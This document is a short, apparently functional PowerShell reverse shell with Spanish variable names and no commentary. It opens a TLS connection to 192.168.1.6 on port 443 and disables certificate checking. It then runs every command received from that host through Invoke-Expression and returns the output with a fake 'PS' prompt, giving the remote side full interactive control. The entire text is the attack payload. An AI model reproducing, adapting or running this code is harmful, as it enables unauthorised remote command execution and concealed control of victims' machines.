$servidor = new-object System.Net.Sockets.TcpClient('192.168.1.6', 443);
if($servidor -eq $null){exit 1}
$transferencia = $servidor.GetStream();
$SSL = New-Object System.Net.Security.SslStream($transferencia,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));
$SSL.AuthenticateAsClient('fake.com', $null, "Tls12", $false);
$Escribir = new-object System.IO.StreamWriter($SSL);
$Bfr = new-object System.Byte[] 1024;
$Escribir.Write('PS ' + (pwd).Path + '> ')
$Escribir.flush()
while(($i = $SSL.Read($Bfr, 0, $Bfr.Length)) -ne 0)
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bfr,0, $i);
$SB = (iex $data | Out-String ) 2>&1;
$SB2 = $SB + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($SB2);
$SSL.Write($sendbyte,0,$sendbyte.Length);$SSL.Flush()}
$Escribir.close();$servidor.close();
